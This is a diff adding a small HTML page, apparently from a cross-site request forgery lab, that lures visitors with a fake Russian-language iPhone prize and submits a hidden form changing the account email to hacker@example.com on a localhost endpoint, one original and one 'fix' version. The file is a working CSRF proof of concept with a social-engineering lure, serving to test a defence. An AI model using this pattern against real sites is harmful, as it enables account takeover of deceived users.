@@ -1,0 +1,20 @@
+<!-- attacker.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Вы выиграли приз!</title>
+</head>
+<body>
+    <h1>🎉 Вы выиграли iPhone!</h1>
+    <p>Чтобы получить приз, нажмите кнопку ниже:</p>
+
+    <!-- Форма, которая отправляет запрос на ваш сайт -->
+    <!-- <form id="csrf-form" action="http://localhost/csrf_change-email.php" method="POST"> -->
+    <form id="csrf-form" action="http://localhost/fix_csrf_change-email.php" method="POST">
+        <input type="hidden" name="email" value="hacker@example.com">
+    </form>
+
+    <button onclick="document.getElementById('csrf-form').submit()">Получить приз</button>
+</body>
+</html>
